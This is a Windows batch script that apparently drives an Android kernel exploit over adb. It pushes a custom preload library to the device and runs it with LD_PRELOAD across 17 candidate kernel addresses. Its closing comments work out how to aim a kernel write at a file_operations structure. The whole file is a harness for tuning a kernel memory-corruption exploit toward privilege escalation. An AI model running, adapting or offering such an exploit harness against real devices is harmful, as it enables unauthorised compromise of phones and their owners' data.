@echo off
cd /d C:\Users\13546\Desktop\platform-tools_r33.0.2-windows\platform-tools

echo ====== v25 tree_pc scan OFF +/- 0x40 (step 8) ======
echo.

adb push C:\Users\13546\Desktop\preload_mtk_v25.so /data/local/tmp/preload.so
adb shell chmod 0644 /data/local/tmp/preload.so

echo [1/17] OFF-0x40 = ffffff80028e7699
adb shell "PSELECT_TREE_PC=ffffff80028e7699 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_01.txt

echo [2/17] OFF-0x38 = ffffff80028e76a1
adb shell "PSELECT_TREE_PC=ffffff80028e76a1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_02.txt

echo [3/17] OFF-0x30 = ffffff80028e76a9
adb shell "PSELECT_TREE_PC=ffffff80028e76a9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_03.txt

echo [4/17] OFF-0x28 = ffffff80028e76b1
adb shell "PSELECT_TREE_PC=ffffff80028e76b1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_04.txt

echo [5/17] OFF-0x20 = ffffff80028e76b9
adb shell "PSELECT_TREE_PC=ffffff80028e76b9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_05.txt

echo [6/17] OFF-0x18 = ffffff80028e76c1
adb shell "PSELECT_TREE_PC=ffffff80028e76c1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_06.txt

echo [7/17] OFF-0x10 = ffffff80028e76c9
adb shell "PSELECT_TREE_PC=ffffff80028e76c9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_07.txt

echo [8/17] OFF-0x08 = ffffff80028e76d1
adb shell "PSELECT_TREE_PC=ffffff80028e76d1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_08.txt

echo [9/17] OFF = ffffff80028e76d9 (KNOWN TRIGGER)
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_09.txt

echo [10/17] OFF+0x08 = FOPS-8 = ffffff80028e76e1 (KNOWN FAIL)
adb shell "PSELECT_TREE_PC=ffffff80028e76e1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_10.txt

echo [11/17] OFF+0x10 = FOPS = ffffff80028e76e9
adb shell "PSELECT_TREE_PC=ffffff80028e76e9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_11.txt

echo [12/17] OFF+0x18 = ffffff80028e76f1
adb shell "PSELECT_TREE_PC=ffffff80028e76f1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_12.txt

echo [13/17] OFF+0x20 = ffffff80028e76f9
adb shell "PSELECT_TREE_PC=ffffff80028e76f9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_13.txt

echo [14/17] OFF+0x28 = ffffff80028e7701
adb shell "PSELECT_TREE_PC=ffffff80028e7701 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_14.txt

echo [15/17] OFF+0x30 = ffffff80028e7709
adb shell "PSELECT_TREE_PC=ffffff80028e7709 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_15.txt

echo [16/17] OFF+0x38 = ffffff80028e7711
adb shell "PSELECT_TREE_PC=ffffff80028e7711 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_16.txt

echo [17/17] OFF+0x40 = ffffff80028e7719
adb shell "PSELECT_TREE_PC=ffffff80028e7719 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 5" 2>&1 > v25_scan_17.txt

echo.
echo ====== SCAN DONE ======
echo Key: grep for "ret=" in each file. ret ^> 10 means trigger.
echo OFF trigger parent list: OFF, OFF-0x10=FOPS-0x20, ...
echo Write target = (tree_pc ^& ~3) + 8
echo We want target = FOPS = ffffff80028e76e8
echo Need: parent + 8 = FOPS -^> parent = ffffff80028e76e0 = OFF+8 = FOPS-8
pause
